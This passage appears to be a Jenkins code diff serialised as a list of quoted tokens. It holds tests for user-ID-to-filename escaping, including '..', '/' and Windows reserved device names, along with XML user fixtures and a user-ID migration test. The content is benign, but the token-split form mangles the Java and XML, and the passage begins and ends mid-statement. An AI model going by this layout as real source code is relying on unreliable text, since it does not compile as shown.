"CaseSensitive", "(", ");", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "user1", "\"", "),", "is", "(", "\"", "user1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "User1", "\"", "),", "is", "(", "\"", "User1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "USER1", "\"", "),", "is", "(", "\"", "USER1", "\"", "))", ";", "}", "private", "void", "assertRestrictedNames", "(", ")", "{", "assertEquals", "(", "\"$", "002f", "\"", ",", "idStrategy", ".", "filenameOf", "(", "\".", "\")", ");", "/", "/", "\"", ".\"", "and", "\"", "/\"", "are", "equivalent", "from", "an", "implementation", "standpoint", ",", "but", "both", "should", "return", "\"", "/\"", "assertEquals", "(", "\"/", "\",", "idStrategy", ".", "idFromFilename", "(", "idStrategy", ".", "filenameOf", "(", "\".", "\")", "))", ";", "assertEquals", "(", "\"$", "002f", "\"", ",", "idStrategy", ".", "filenameOf", "(", "\"\"", "))", ";", "/", "/", "\"", "\"", "and", "\"", "/\"", "are", "equivalent", "from", "an", "implementation", "standpoint", ",", "but", "both", "should", "return", "\"", "/\"", "assertEquals", "(", "\"/", "\",", "idStrategy", ".", "idFromFilename", "(", "idStrategy", ".", "filenameOf", "(", "\"\"", "))", ");", "assertRoundTrip", "(", "\"/", "\",", "\"", "$", "002f", "\"", ");", "assertRoundTrip", "(", "\".", ".\"", ",", "\"", "$", "002e", "$", "002e", "\"", ");", "assertRoundTrip", "(", "\"", "con", "\"", ",", "\"", "$", "0063on", "\"", ");", "assertRoundTrip", "(", "\"", "prn", "\"", ",", "\"", "$", "0070rn", "\"", ");", "assertRoundTrip", "(", "\"", "aux", "\"", ",", "\"", "$", "0061ux", "\"", ");", "assertRoundTrip", "(", "\"", "nul", "\"", ",", "\"", "$", "006eul", "\"", ");", "assertRoundTrip", "(", "\"", "com1", "\"", ",", "\"", "$", "0063om1", "\"", ");", "assertRoundTrip", "(", "\"", "com2", "\"", ",", "\"", "$", "0063om2", "\"", ");", "assertRoundTrip", "(", "\"", "com3", "\"", ",", "\"", "$", "0063om3", "\"", ");", "assertRoundTrip", "(", "\"", "com4", "\"", ",", "\"", "$", "0063om4", "\"", ");", "assertRoundTrip", "(", "\"", "com5", "\"", ",", "\"", "$", "0063om5", "\"", ");", "assertRoundTrip", "(", "\"", "com6", "\"", ",", "\"", "$", "0063om6", "\"", ");", "assertRoundTrip", "(", "\"", "com7", "\"", ",", "\"", "$", "0063om7", "\"", ");", "assertRoundTrip", "(", "\"", "com8", "\"", ",", "\"", "$", "0063om8", "\"", ");", "assertRoundTrip", "(", "\"", "com9", "\"", ",", "\"", "$", "0063om9", "\"", ");", "assertRoundTrip", "(", "\"", "lpt1", "\"", ",", "\"", "$", "006cpt1", "\"", ");", "assertRoundTrip", "(", "\"", "lpt2", "\"", ",", "\"", "$", "006cpt2", "\"", ");", "assertRoundTrip", "(", "\"", "lpt3", "\"", ",", "\"", "$", "006cpt3", "\"", ");", "assertRoundTrip", "(", "\"", "lpt4", "\"", ",", "\"", "$", "006cpt4", "\"", ");", "assertRoundTrip", "(", "\"", "lpt5", "\"", ",", "\"", "$", "006cpt5", "\"", ");", "assertRoundTrip", "(", "\"", "lpt6", "\"", ",", "\"", "$", "006cpt6", "\"", ");", "assertRoundTrip", "(", "\"", "lpt7", "\"", ",", "\"", "$", "006cpt7", "\"", ");", "assertRoundTrip", "(", "\"", "lpt8", "\"", ",", "\"", "$", "006cpt8", "\"", ");", "assertRoundTrip", "(", "\"", "lpt9", "\"", ",", "\"", "$", "006cpt9", "\"", ");", "@", "Test", "public", "void", "testKeyForCaseSensitiveEmailAddress", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitiveEmailAddress", "(", ");", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", "),", "is", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "),", "is", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "John", ".", "Smith", "@", "ACME", ".", "org", "\"", "),", "is", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "ORG", "\"", "),", "is", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "john", ".", "smith", "\"", "),", "is", "(", "\"", "john", ".", "smith", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "John", ".", "Smith", "\"", "),", "is", "(", "\"", "John", ".", "Smith", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "john", "@", "smith", "@", "acme", ".", "org", "\"", "),", "is", "(", "\"", "john", "@", "smith", "@", "acme", ".", "org", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "John", "@", "Smith", "@", "acme", ".", "org", "\"", "),", "is", "(", "\"", "John", "@", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "}", "private", "void", "assertRoundTrip", "(", "String", "username", ",", "String", "filename", ")", "{", "assertEquals", "(", "filename", ",", "idStrategy", ".", "filenameOf", "(", "username", ")", ");", "assertEquals", "(", "username", ",", "idStrategy", ".", "idFromFilename", "(", "filename", ")", ");", "@", "Test", "public", "void", "testCompareCaseInsensitive", "(", ")", "{", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "user1", "\"", ",", "\"", "user2", "\"", ")", "<", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "user2", "\"", ",", "\"", "user1", "\"", ")", ">", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "user1", "\"", ",", "\"", "user1", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "USER1", "\"", ",", "\"", "user2", "\"", ")", "<", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "USER2", "\"", ",", "\"", "user1", "\"", ")", ">", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "User1", "\"", ",", "\"", "user1", "\"", ")", "=", "=", "0", ")", ";", "}", "private", "void", "assertCaseInsensitiveRoundTrip", "(", "String", "username", ",", "String", "filename", ")", "{", "assertEquals", "(", "filename", ",", "idStrategy", ".", "filenameOf", "(", "username", ")", ");", "assertEquals", "(", "username", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ",", "idStrategy", ".", "idFromFilename", "(", "filename", ")", ");", "@", "Test", "public", "void", "testCompareCaseSensitive", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "user1", "\"", ",", "\"", "user2", "\"", ")", "<", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "user2", "\"", ",", "\"", "user1", "\"", ")", ">", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "user1", "\"", ",", "\"", "user1", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "USER1", "\"", ",", "\"", "user2", "\"", ")", "<", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "USER2", "\"", ",", "\"", "user1", "\"", ")", "<", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "User1", "\"", ",", "\"", "user1", "\"", ")", "<", "0", ")", ";", "}", "@", "Test", "public", "void", "testCompareCaseSensitiveEmail", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitiveEmailAddress", "(", ");", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "John", ".", "Smith", "@", "ACME", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "ORG", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "john", ".", "smith", "\"", ",", "\"", "john", ".", "smith", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "John", ".", "Smith", "\"", ",", "\"", "John", ".", "Smith", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "john", "@", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "john", "@", "smith", "@", "acme", ".", "org", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "John", "@", "Smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", "@", "Smith", "@", "acme", ".", "org", "\"", ")", "=", "=", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ",", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ")", "<", "0", ")", ";", "assertTrue", "(", "idStrategy", ".", "compare", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", ")", ">", "0", ")", ";", "}", "private", "void", "assertRestrictedNames", "(", "IdStrategy", "idStrategy", ")", "{", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "002f", "\"", "),", "is", "(", "\"/", "\")", ");", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "002e", "$", "002e", "\"", "),", "is", "(", "\".", ".\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063on", "\"", "),", "is", "(", "\"", "con", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0070rn", "\"", "),", "is", "(", "\"", "prn", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0061ux", "\"", "),", "is", "(", "\"", "aux", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006eul", "\"", "),", "is", "(", "\"", "nul", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om1", "\"", "),", "is", "(", "\"", "com1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om2", "\"", "),", "is", "(", "\"", "com2", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om3", "\"", "),", "is", "(", "\"", "com3", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om4", "\"", "),", "is", "(", "\"", "com4", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om5", "\"", "),", "is", "(", "\"", "com5", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om6", "\"", "),", "is", "(", "\"", "com6", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om7", "\"", "),", "is", "(", "\"", "com7", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om8", "\"", "),", "is", "(", "\"", "com8", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "0063om9", "\"", "),", "is", "(", "\"", "com9", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt1", "\"", "),", "is", "(", "\"", "lpt1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt2", "\"", "),", "is", "(", "\"", "lpt2", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt3", "\"", "),", "is", "(", "\"", "lpt3", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt4", "\"", "),", "is", "(", "\"", "lpt4", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt5", "\"", "),", "is", "(", "\"", "lpt5", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt6", "\"", "),", "is", "(", "\"", "lpt6", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt7", "\"", "),", "is", "(", "\"", "lpt7", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt8", "\"", "),", "is", "(", "\"", "lpt8", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006cpt9", "\"", "),", "is", "(", "\"", "lpt9", "\"", "))", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "17", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "user1", "<", "/", "string", ">", "<", "string", ">", "user2957281690483826750", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "entry", ">", "<", "string", ">", "user1", "<", "/", "string", ">", "<", "string", ">", "user6639871027538302990", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "entry", ">", "<", "string", ">", "user2", "<", "/", "string", ">", "<", "string", ">", "user22222", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", "@", "@", "Lorem", "ipsum", "dolor", "sit", "amet", ",", "consectetur", "adipiscing", "elit", ",", "sed", "do", "eiusmod", "tempor", "incididunt", "ut", "labore", "et", "dolore", "magna", "aliqua", ".", "Ut", "enim", "ad", "minim", "veniam", ",", "quis", "nostrud", "exercitation", "ullamco", "laboris", "nisi", "ut", "aliquip", "ex", "ea", "commodo", "consequat", ".", "Duis", "aute", "irure", "dolor", "in", "reprehenderit", "in", "voluptate", "velit", "esse", "cillum", "dolore", "eu", "fugiat", "nulla", "pariatur", ".", "Excepteur", "sint", "occaecat", "cupidatat", "non", "proident", ",", "sunt", "in", "culpa", "qui", "officia", "deserunt", "mollit", "anim", "id", "est", "laborum", ".", "@", "@", "-", "0", ",", "0", "+", "1", ",", "4", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Foo", "Bar", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "4", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "Old", "Legacy", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "fred", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "5", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "id", ">", "jane", "<", "/", "id", ">", "<", "fullName", ">", "Fred", "Smith", "<", "/", "fullName", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "9", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "fred", "<", "/", "string", ">", "<", "string", ">", "user4975613142751794216", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "9", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "fred", "<", "/", "string", ">", "<", "string", ">", "user4975613142751794216", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "/", "user", ">", "@", "@", "-", "107", ",", "19", "+", "107", ",", "21", "@", "@", "private", "void", "modifyNode", "(", "Node", "node", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "reloadUserConfig", "(", ")", "throws", "Exception", "{", "String", "originalName", "=", "\"", "oldName", "\"", ";", "String", "temporaryName", "=", "\"", "newName", "\"", ";", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "some_user", "\"", ",", "true", ",", "null", ")", ";", "user", ".", "setFullName", "(", "\"", "oldName", "\"", ");", "user", ".", "setFullName", "(", "originalName", ")", ";", "user", ".", "save", "(", ");", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "originalName", ")", ");", "replace", "(", "\"", "users", "/", "some_user", "/", "config", ".", "xml", "\"", ",", "\"", "oldName", "\"", ",", "\"", "newName", "\"", ");", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "oldName", "\"", "))", ";", "user", ".", "setFullName", "(", "temporaryName", ")", ";", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "temporaryName", ")", ");", "}", "reloadJenkinsConfigurationViaCliAndWait", "(", ");", "{", "User", "user", "=", "User", ".", "getById", "(", "\"", "some_user", "\"", ",", "false", ")", ";", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "\"", "newName", "\"", "))", ";", "assertThat", "(", "user", ".", "getFullName", "(", "),", "equalTo", "(", "originalName", ")", ");", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "61", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "reactor", ".", "ReactorException", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "recipes", ".", "LocalData", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "static", "org", ".", "hamcrest", ".", "CoreMatchers", ".", "is", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertThat", ";", "public", "class", "UserIdMigratorTest", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Test", "@", "LocalData", "public", "void", "migrateSimpleUser", "(", ")", "throws", "InterruptedException", ",", "ReactorException", ",", "IOException", "{", "String", "userId", "=", "\"", "fred", "\"", ";", "User", "fred", "=", "User", ".", "getById", "(", "userId", ",", "false", ")", ";", "assertThat", "(", "fred", ".", "getFullName", "(", "),", "is", "(", "\"", "Fred", "Smith", "\"", "))", ";", "}", "@", "Test", "@", "LocalData", "public", "void", "migrateMultipleUsers", "(", ")", "throws", "InterruptedException", ",", "ReactorException", ",", "IOException", "{", "assertThat", "(", "User", ".", "getAll", "(", ").", "size", "(", "),", "is", "(", "3", ")", ");", "User", "fred", "=", "User", ".", "getById", "(", "\"", "fred", "\"", ",", "false", ")", ";", "assertThat", "(", "fred", ".", "getFullName", "(", "),", "is", "(", "\"", "Fred", "Smith", "\"", "))", ";", "User", "legacyUser", "=", "User", ".", "getById", "(", "\"", "foo", "/", "bar", "\"", ",", "false", ")", ";", "assertThat", "(", "legacyUser", ".", "getFullName", "(", "),", "is", "(", "\"", "Foo", "Bar", "\"", "))", ";", "User", "oldLegacyUser", "=", "User", ".", "getById", "(", "\"", "zzz", "\\", "u1000", "\"", ",", "false", ")", ";", "assertThat", "(", "oldLegacyUser", ".", "getFullName", "(", "),", "is", "(", "\"", "Old", "Legacy", "\"", "))", ";", "}", "}", "@", "@", "-", "19", ",", "8", "+", "19", ",", "6", "@", "@", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "List", ";", "import", "static", "hudson", ".", "model", ".", "User", ".", "idStrategy", ";", "import", "static", "hudson", ".", "model", ".", "UserPropertyTest", ".", "InnerUserClass", ".", "TEST_FILE", ";", "import", "static", "java", ".", "lang", ".", "System", ".", "currentTimeMillis", ";", "import", "static", "java", ".", "util", ".", "Collections", ".", "emptyMap", ";", "import", "static", "org", ".", "apache", ".", "commons", ".", "io", ".", "FileUtils", ".", "writeStringToFile", ";", "@", "@", "-", "80", ",", "7", "+", "78", ",", "8", "@", "@", "public", "void", "nestedUserReference", "(", ")", "throws", "Exception", "{", "User", "user", "=", "User", ".", "get", "(", "\"", "nestedUserReference", "\"", ",", "false", ",", "emptyMap", "(", "))", ";", "assertThat", "(", "\"", "nested", "reference", "should", "be", "updated", "after", "jenkins", 